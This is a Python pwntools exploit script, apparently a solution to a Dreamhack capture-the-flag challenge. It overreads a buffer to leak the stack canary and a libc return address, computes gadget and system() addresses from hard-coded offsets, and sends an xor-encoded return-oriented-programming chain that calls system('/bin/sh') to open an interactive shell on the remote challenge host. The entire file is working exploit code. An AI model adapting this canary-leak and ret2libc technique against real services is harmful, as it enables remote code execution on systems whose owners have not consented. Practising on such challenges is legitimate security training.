from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# p = process('./prob')
p = remote('host3.dreamhack.games', 10038)
e = ELF('./prob')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

def xor_encrypt(data):
    data = bytearray(data)

    for i in range(1, len(data)):
        data[i-1] ^= data[i]

    return bytes(data)

def xor_decrypt(data):
    data = bytearray(data)

    for i in range(len(data) - 1, 0, -1):
        data[i - 1] ^= data[i]

    return bytes(data)

# Leak Canary
payload = b''
for i in range(0x19):
    payload += chr(i).encode()
p.sendafter(b'Input: ', payload)

p.recvuntil(b': ')
p.recvn(0x19)

cnry = u64(b'\x00' + p.recvn(7))

slog('canary', cnry)

# Exploit
libc_pop_rdi_offset         = 0x2a3e5
libc_ret_offset             = 0x29cd6
libc_start_call_main_offset = 0x29d10
libc_system_offset          = 0x50d60
libc_binsh_offset           = 0x1d8698

payload = b''
for i in range(0x28):
    payload += chr(i).encode()
p.sendafter(b'Input: ', payload)

p.recvuntil(b': ')
p.recvn(0x28)

ret_addr = u64(p.recvn(0x6) + b'\x00' * 2)

libc_base       = ret_addr - 128 - libc_start_call_main_offset
libc_pop_rdi    = libc_base + libc_pop_rdi_offset
libc_ret        = libc_base + libc_ret_offset
libc_system     = libc_base + libc_system_offset
libc_binsh      = libc_base + libc_binsh_offset

slog('libc base', libc_base)
slog('pop rdi', libc_pop_rdi)
slog('ret', libc_ret)
slog('system', libc_system)
slog('/bin/sh', libc_binsh)

payload = b'exit\x00'.ljust(0x18, b'\x00') + p64(cnry) + b'12345678'
payload += p64(libc_pop_rdi) + p64(libc_binsh)
payload += p64(libc_ret) + p64(libc_system)
payload = xor_decrypt(payload)

p.sendafter(b'Input: ', payload)

p.interactive()